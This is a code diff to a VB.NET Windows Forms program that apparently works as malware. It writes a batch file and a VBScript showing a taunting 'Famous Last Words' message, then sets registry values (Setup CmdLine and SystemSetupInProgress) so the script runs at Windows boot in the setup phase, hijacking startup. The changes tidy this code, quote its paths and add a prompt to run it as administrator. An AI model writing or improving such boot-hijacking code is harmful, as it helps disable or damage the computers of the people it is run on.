@@ -80,7 +80,7 @@ Public Class Form2
         Dim vbsFilePath As String = "C:\temp.vbs"
         Dim batFilePath As String = "C:\temp.bat"
 
-        ' Create the VBScript content
+        ' VBScript content
         Dim vbsContent As String =
         "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"", 0, ""utkudrk.exe""" & vbCrLf &
         "Dim userInput" & vbCrLf &
@@ -107,23 +107,27 @@ Public Class Form2
         "Set shell = Nothing" & vbCrLf &
         "Set fso = Nothing"
 
-        ' Create the batch file content
-        Dim batContent As String = "@echo off" & vbCrLf &
+        ' Batch file content
+        Dim batContent As String =
+        "@echo off" & vbCrLf &
         "echo Creating VBScript file..." & vbCrLf &
-        "echo " & vbsContent.Replace(vbCrLf, "^& echo ") & " > " & vbsFilePath & vbCrLf &
+        "echo " & vbsContent.Replace(vbCrLf, "^& echo ") & " > """ & vbsFilePath & """" & vbCrLf &
         "echo VBScript file created." & vbCrLf &
-        "cscript //nologo " & vbsFilePath
+        "cscript //nologo """ & vbsFilePath & """"
 
-        ' Write the batch and VBScript content to files
         Try
-            System.IO.File.WriteAllText(batFilePath, batContent)
+            ' Write the VBScript and batch file content
+            File.WriteAllText(batFilePath, batContent)
 
-            ' Attempt to modify the registry for OOBE
+            ' Registry paths
             Dim setupKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
             Dim systemSetupKeyPath As String = "SYSTEM\Setup"
 
+            ' Update registry keys
             Using setupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(setupKeyPath)
-                setupKey.SetValue("CmdLine", batFilePath, RegistryValueKind.String)
+                If setupKey IsNot Nothing Then
+                    setupKey.SetValue("CmdLine", batFilePath, RegistryValueKind.String)
+                End If
             End Using
 
             Using systemSetupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(systemSetupKeyPath)
@@ -134,6 +138,8 @@ Public Class Form2
                     systemSetupKey.SetValue("SystemSetupInProgress", 1, RegistryValueKind.DWord)
                 End If
             End Using
+        Catch ex As UnauthorizedAccessException
+            MessageBox.Show("Access denied! Run the application as administrator.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         Catch ex As Exception
             MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End Try
